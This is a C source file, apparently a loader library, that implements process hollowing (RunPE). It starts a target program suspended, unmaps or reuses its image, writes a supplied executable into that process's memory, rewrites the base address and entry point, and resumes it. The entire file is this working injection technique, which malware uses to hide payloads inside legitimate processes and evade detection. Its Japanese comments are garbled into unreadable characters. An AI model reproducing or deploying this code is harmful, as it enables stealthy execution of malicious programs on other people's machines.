#define WIN32_LEAN_AND_MEAN
#define STRICT

#include <windows.h>
#include <windowsx.h>
#include <tchar.h>

#include "LoaderLib.h"

// MT�V�O�l�`���̃T�C�Y
#define SIZE_OF_NT_SIGNATURE    4

// NT�V�O�l�`��
#define NTSIGNATURE(ptr) (  \
    (LPVOID)((PBYTE)(ptr) + \
    ((PIMAGE_DOS_HEADER)(ptr))->e_lfanew))

// PE�w�b�_�I�t�Z�b�g
#define PEFHDROFFSET(ptr) ( \
    (LPVOID)((PBYTE)(ptr) + \
    ((PIMAGE_DOS_HEADER)(ptr))->e_lfanew + \
    SIZE_OF_NT_SIGNATURE))

// �I�v�V�����w�b�_�I�t�Z�b�g
#define OPTHDROFFSET(ptr) ( \
    (LPVOID)((PBYTE)(ptr) + \
    ((PIMAGE_DOS_HEADER)(ptr))->e_lfanew + \
    SIZE_OF_NT_SIGNATURE +  \
    sizeof(IMAGE_FILE_HEADER)))

// �Z�N�V�����w�b�_�I�t�Z�b�g
#define SECHDROFFSET(ptr) ( \
    (LPVOID)((PBYTE)(ptr) + \
    ((PIMAGE_DOS_HEADER)(ptr))->e_lfanew + \
    SIZE_OF_NT_SIGNATURE +  \
    sizeof(IMAGE_FILE_HEADER) + \
    sizeof(IMAGE_OPTIONAL_HEADER)))


// PE�w�b�_�̃|�C���^�\����
typedef struct {
	PIMAGE_DOS_HEADER       dsh;
	PIMAGE_FILE_HEADER      pfh; 
	PIMAGE_OPTIONAL_HEADER  poh;
	PIMAGE_SECTION_HEADER   psh;
} PE_HEADERS, *PPE_HEADERS;


// �֐��̒�`
DWORD  GetAlignedSize(DWORD, DWORD);
DWORD  TotalNewImageSize(PPE_HEADERS);
LPVOID LoadPEImage(PPE_HEADERS, LPVOID, DWORD);
VOID   FreePEImage(LPVOID, DWORD);
int    ExecPEImage(PPE_HEADERS, LPVOID, DWORD, PTCHAR);


// -------------------------------------------------------------
// �v���Z�X�������s�����C���֐�
//   �����FpPEFileImage   �i�t�@�C���f�[�^�̃|�C���^�j
//         dwFileImageSize�i�t�@�C���f�[�^�̃T�C�Y�j
//         szTargetProc   �i�^�[�Q�b�g�v���Z�X�p�X�j
// �߂�l�F������0�A���s��0�ȊO
// -------------------------------------------------------------
int CreateExeProcess(LPVOID pPEFileImage,
					 DWORD dwFileImageSize,
					 PTCHAR szTargetProc)
{
	// ���ꂼ��̃w�b�_�|�C���^�擾
	PE_HEADERS pe;
	pe.dsh = (PIMAGE_DOS_HEADER)pPEFileImage;
	pe.pfh = (PIMAGE_FILE_HEADER)PEFHDROFFSET(pPEFileImage);
	pe.poh = (PIMAGE_OPTIONAL_HEADER)OPTHDROFFSET(pPEFileImage);
	pe.psh = (PIMAGE_SECTION_HEADER)SECHDROFFSET(pPEFileImage);
	
	// MZ����
    if(pe.dsh->e_magic != IMAGE_DOS_SIGNATURE)
        return -1;

	// PE����
    if(*(DWORD *)NTSIGNATURE(pPEFileImage) != IMAGE_NT_SIGNATURE)
        return -1;

	// ���s�t�@�C������
	if(pe.poh->Magic != 0x010B)
        return -1;

	// �������C���[�W�T�C�Y���擾
	DWORD dwMemImageSize = TotalNewImageSize(&pe);
	
	// �������C���[�W�����[�h�i�������m�ہj
	LPVOID pMemImage = LoadPEImage(
		&pe, pPEFileImage, dwMemImageSize);
	if(pMemImage == NULL)
		return -1;

	// �v���Z�X���N��
	if(ExecPEImage(&pe, pMemImage, dwMemImageSize, szTargetProc))
		return -1;

	// �������C���[�W���J���i�������J���j
	FreePEImage(pMemImage, dwMemImageSize);
	return 0;
}

// -------------------------------------------------------------
// dwCurSize��dwAlignment�̔{���l�ɕϊ�����֐�
//   �����FdwCurSize  �i�����l�j
//         dwAlignment�i�{���P�ʁj
// �߂�l�FdwAlignment�̔{���l
// -------------------------------------------------------------
DWORD GetAlignedSize(DWORD dwCurSize, 
					 DWORD dwAlignment)
{
	if(dwCurSize % dwAlignment == 0)
		return dwCurSize;
	return (((dwCurSize / dwAlignment) + 1) * dwAlignment);
}

// -------------------------------------------------------------
// �������C���[�W�̃T�C�Y���v�Z����֐�
//   �����Fpe�iPE�t�@�C���̃w�b�_�|�C���^�\���̂̃|�C���^�j
// �߂�l�F�������C���[�W�̃T�C�Y
// -------------------------------------------------------------
DWORD TotalNewImageSize(PPE_HEADERS pe)
{
	// �w�b�_�̃T�C�Y����
	DWORD dwRet = GetAlignedSize(
		pe->poh->SizeOfHeaders, pe->poh->SectionAlignment);

	// �Z�N�V�������Ƃ̃T�C�Y�����Z
	for(int i=0; i < pe->pfh->NumberOfSections; i++){
		if( ! pe->psh[i].Misc.VirtualSize)
			continue;
		dwRet += GetAlignedSize(
			pe->psh[i].Misc.VirtualSize, pe->poh->SectionAlignment);
	}

	// PE�t�@�C���̃C���[�W�T�C�Y��Ԃ�
	return dwRet;
}

// -------------------------------------------------------------
// �t�@�C���C���[�W���烁�����C���[�W�𐶐�����֐�
//   �����Fpe�iPE�t�@�C���̃w�b�_�|�C���^�\���̂̃|�C���^�j
//         lpFileImage�i�t�@�C���C���[�W�̃|�C���^�j
//         dwMemSize  �i�������C���[�W�̃T�C�Y�j
// �߂�l�F�������������C���[�W�̃|�C���^�A���s��NULL
// �@���l�F�v���Z�X�̃������C���[�W���i�[���邽�߂̃������̈��
// VirtualAlloc�֐��ɂĊm�ۂ��邽�߁A���̊֐����Ăяo������A��
// �̌�FreePEImage�֐����Ăяo�����������J�����Ȃ���΂Ȃ�Ȃ��B
// -------------------------------------------------------------
LPVOID LoadPEImage(PPE_HEADERS pe, 
				   LPVOID lpFileImage, 
				   DWORD dwMemSize)
{
	// ���������m��
	LPVOID lpMemImage = (PTCHAR)VirtualAlloc(
		NULL, dwMemSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(lpMemImage == NULL)
		return NULL;

	PTCHAR szInPtr  = (PTCHAR)lpFileImage;
	PTCHAR szOutPtr = (PTCHAR)lpMemImage;

	// �w�b�_���������C���[�W�Ƃ��ăR�s�[
	DWORD dwHeaderSize = pe->poh->SizeOfHeaders;
	for(int i=0; i < pe->pfh->NumberOfSections; i++){
		if(pe->psh[i].PointerToRawData < dwHeaderSize)
			dwHeaderSize = pe->psh[i].PointerToRawData;
	}
	CopyMemory(szOutPtr, szInPtr, dwHeaderSize);

	// �|�C���^�ړ�
	szOutPtr += GetAlignedSize(
		pe->poh->SizeOfHeaders, pe->poh->SectionAlignment);
	
	// �S�Z�N�V�������������C���[�W�Ƃ��ăR�s�[
	for(int i=0; i < pe->pfh->NumberOfSections; i++){
		
		// �Z�N�V�����T�C�Y��0�ȉ��Ȃ�Ζ���
		if(pe->psh[i].SizeOfRawData <= 0){
			// ����VirtualSize������Ȃ�X�V
			if(pe->psh[i].Misc.VirtualSize){
				szInPtr += GetAlignedSize(
					pe->psh[i].Misc.VirtualSize, 
					pe->poh->SectionAlignment);
			}
			continue;
		}
		
		// �Z�N�V�����̓ǂݍ��݃T�C�Y���擾
		DWORD dwToRead = pe->psh[i].SizeOfRawData;
		if(dwToRead > pe->psh[i].Misc.VirtualSize)
			dwToRead = pe->psh[i].Misc.VirtualSize;

		// 1�Z�N�V�������������C���[�W�Ƃ��ăR�s�[
		szInPtr = (PTCHAR)lpFileImage + pe->psh[i].PointerToRawData;
		CopyMemory(szOutPtr, szInPtr, dwToRead);
		
		// �|�C���^�ړ�
		szOutPtr += GetAlignedSize(
			pe->psh[i].Misc.VirtualSize, pe->poh->SectionAlignment);
	}

	// �������|�C���^��Ԃ�
	return lpMemImage;
}

// -------------------------------------------------------------
// LoadPEImage�֐��ɂĊm�ۂ��ꂽ�������̈���J������֐�
//   �����FlpMem�i�������C���[�W�̃|�C���^�j
//         dwMemSize�i�������C���[�W�̃T�C�Y�j
// �߂�l�F�Ȃ�
// -------------------------------------------------------------
VOID FreePEImage(LPVOID lpMem, DWORD dwMemSize)
{
	VirtualFree(lpMem, dwMemSize, MEM_DECOMMIT);
}

// ZwUnmapViewOfSection�֐��Ăяo���̂��߂̒�`
typedef DWORD (WINAPI *PTRZwUnmapViewOfSection)(IN HANDLE, IN PVOID);

// �v���Z�X���̍\����
typedef struct {
	DWORD    dwBaseAddr;
	DWORD    dwImageSize;
} PROCINFO, *PPROCINFO;

// -------------------------------------------------------------
// �������C���[�W�����s����֐�
//   �����Fpe�iPE�t�@�C���̃w�b�_�|�C���^�\���̂̃|�C���^�j
//         pMemImage     �i�������C���[�W�̃|�C���^�j
//         dwMemImageSize�i�������C���[�W�̃T�C�Y�j
//         szTargetProc  �i�^�[�Q�b�g�v���Z�X�̃p�X�j
// �߂�l�F������0�A���s��0�ȊO
// -------------------------------------------------------------
int ExecPEImage(PPE_HEADERS pe, 
				LPVOID pMemImage,
				DWORD dwMemImageSize,
				PTCHAR szTargetProc)
{
	// �v���Z�X����
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	BOOL bFlag = CreateProcess(NULL, szTargetProc,
		NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if( ! bFlag)
		return -1;

	// ���������v���Z�X���̃X���b�h�R���e�L�X�g�擾
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &ctx);

	PROCINFO piChildInfo;
	DWORD *pebInfo = (DWORD *)ctx.Ebx;

	// ���������v���Z�X�̃x�[�X�A�h���X���擾
	DWORD dwRead;
	ReadProcessMemory(pi.hProcess, &pebInfo[2], 
		(LPVOID)&(piChildInfo.dwBaseAddr), sizeof(DWORD), &dwRead);
	
	DWORD dwCurAddr = piChildInfo.dwBaseAddr;
	// �t���[�Ɉ����郁�����̈������
	MEMORY_BASIC_INFORMATION mbiInfo;
	while(VirtualQueryEx(pi.hProcess, 
		(LPVOID)dwCurAddr, &mbiInfo, sizeof(mbiInfo)))
	{
		if(mbiInfo.State == MEM_FREE)
			break;
		dwCurAddr += mbiInfo.RegionSize;
	}
	
	// ���������v���Z�X�����蓖�Ă��郁�����T�C�Y���擾
	piChildInfo.dwImageSize = dwCurAddr - (DWORD)piChildInfo.dwBaseAddr;

	LPVOID lpProcessMem;
	
	// �������ꂽ�v���Z�X�̃�������ԂɎ��܂�Ȃ炻�̂܂ܗ��p����
	if(pe->poh->ImageBase == piChildInfo.dwBaseAddr && 
		dwMemImageSize <= piChildInfo.dwImageSize)
	{
		lpProcessMem = (LPVOID)piChildInfo.dwBaseAddr;
		DWORD dwOldProtect;
		VirtualProtectEx(pi.hProcess, 
			(LPVOID)piChildInfo.dwBaseAddr, piChildInfo.dwImageSize, 
			PAGE_EXECUTE_READWRITE, &dwOldProtect);
	
	// �������ꂽ�v���Z�X�̃�������ԂɎ��܂�Ȃ��Ȃ��
	// �V������������Ԃ����蓖�Ă�
	}else{
		// ZwUnmapViewOfSection�֐���
		// �v���Z�X�̉��z�A�h���X��ԂɃ}�b�v���ꂽ�r���[���������
		PTRZwUnmapViewOfSection pZwUnmapViewOfSection = 
			(PTRZwUnmapViewOfSection)GetProcAddress(
			GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
		// ���������J��
		if(pZwUnmapViewOfSection(
			pi.hProcess, (LPVOID)piChildInfo.dwBaseAddr) == 0)
		{
			// �����Ƀ�������Ԃ��m�ۂ���
			lpProcessMem = VirtualAllocEx(pi.hProcess, 
				(LPVOID)pe->poh->ImageBase, dwMemImageSize, 
				MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if( ! lpProcessMem)
				return -1;
		}
	}
	
	pebInfo = (DWORD *)ctx.Ebx;

	// �v���Z�X�̃x�[�X�A�h���X������������
	DWORD dwWrote;
	WriteProcessMemory(pi.hProcess, &pebInfo[2], 
		&lpProcessMem, sizeof(DWORD), &dwWrote);

	// �������C���[�W���v���Z�X��ԂփR�s�[
	if( ! WriteProcessMemory(pi.hProcess, 
		lpProcessMem, pMemImage, dwMemImageSize, NULL))
	{
		TerminateProcess(pi.hProcess, 0);
		return -1;
	}
	
	// �v���O�����̃G���g���|�C���g��EAX��
	if((DWORD)lpProcessMem == piChildInfo.dwBaseAddr)
		ctx.Eax = pe->poh->ImageBase + pe->poh->AddressOfEntryPoint;
	else
		ctx.Eax = (DWORD)lpProcessMem + pe->poh->AddressOfEntryPoint;

	// �R���e�L�X�g���Z�b�g���ăv���Z�X���J�n
	ctx.ContextFlags = CONTEXT_FULL;
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
	return 0;
}
